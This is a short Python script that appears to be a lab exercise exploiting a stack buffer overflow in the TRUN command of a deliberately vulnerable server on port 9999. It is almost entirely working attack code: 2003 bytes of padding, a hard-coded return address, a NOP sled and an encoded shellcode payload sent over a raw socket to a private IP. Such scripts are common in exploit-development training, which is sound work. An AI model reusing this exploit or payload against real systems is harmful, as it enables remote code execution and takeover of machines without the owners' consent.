#! /usr/bin/python
import sys, socket
# from time import sleep

# Make sure to add the paranthesis!
overflow=(b"\xb8\xa9\xa3\x23\x2a\xd9\xce\xd9\x74\x24\xf4\x5a\x33\xc9"
b"\xb1\x52\x31\x42\x12\x83\xc2\x04\x03\xeb\xad\xc1\xdf\x17"
b"\x59\x87\x20\xe7\x9a\xe8\xa9\x02\xab\x28\xcd\x47\x9c\x98"
b"\x85\x05\x11\x52\xcb\xbd\xa2\x16\xc4\xb2\x03\x9c\x32\xfd"
b"\x94\x8d\x07\x9c\x16\xcc\x5b\x7e\x26\x1f\xae\x7f\x6f\x42"
b"\x43\x2d\x38\x08\xf6\xc1\x4d\x44\xcb\x6a\x1d\x48\x4b\x8f"
b"\xd6\x6b\x7a\x1e\x6c\x32\x5c\xa1\xa1\x4e\xd5\xb9\xa6\x6b"
b"\xaf\x32\x1c\x07\x2e\x92\x6c\xe8\x9d\xdb\x40\x1b\xdf\x1c"
b"\x66\xc4\xaa\x54\x94\x79\xad\xa3\xe6\xa5\x38\x37\x40\x2d"
b"\x9a\x93\x70\xe2\x7d\x50\x7e\x4f\x09\x3e\x63\x4e\xde\x35"
b"\x9f\xdb\xe1\x99\x29\x9f\xc5\x3d\x71\x7b\x67\x64\xdf\x2a"
b"\x98\x76\x80\x93\x3c\xfd\x2d\xc7\x4c\x5c\x3a\x24\x7d\x5e"
b"\xba\x22\xf6\x2d\x88\xed\xac\xb9\xa0\x66\x6b\x3e\xc6\x5c"
b"\xcb\xd0\x39\x5f\x2c\xf9\xfd\x0b\x7c\x91\xd4\x33\x17\x61"
b"\xd8\xe1\xb8\x31\x76\x5a\x79\xe1\x36\x0a\x11\xeb\xb8\x75"
b"\x01\x14\x13\x1e\xa8\xef\xf4\x8d\x3d\x8c\x84\xa6\x3f\x52"
b"\x94\x6a\xc9\xb4\xfc\x82\x9f\x6f\x69\x3a\xba\xfb\x08\xc3"
b"\x10\x86\x0b\x4f\x97\x77\xc5\xb8\xd2\x6b\xb2\x48\xa9\xd1"
b"\x15\x56\x07\x7d\xf9\xc5\xcc\x7d\x74\xf6\x5a\x2a\xd1\xc8"
b"\x92\xbe\xcf\x73\x0d\xdc\x0d\xe5\x76\x64\xca\xd6\x79\x65"
b"\x9f\x63\x5e\x75\x59\x6b\xda\x21\x35\x3a\xb4\x9f\xf3\x94"
b"\x76\x49\xaa\x4b\xd1\x1d\x2b\xa0\xe2\x5b\x34\xed\x94\x83"
b"\x85\x58\xe1\xbc\x2a\x0d\xe5\xc5\x56\xad\x0a\x1c\xd3\xcd"
b"\xe8\xb4\x2e\x66\xb5\x5d\x93\xeb\x46\x88\xd0\x15\xc5\x38"
b"\xa9\xe1\xd5\x49\xac\xae\x51\xa2\xdc\xbf\x37\xc4\x73\xbf"
b"\x1d")

# The x90 creates padding between our jump point and overflow
shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62" + b"\x90" * 32 + overflow

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('172.16.99.129',9999))
	s.send((b'TRUN /.:/' + shellcode))
	s.close()
		
except:
	print "Error connecting to server"
	sys.exit()
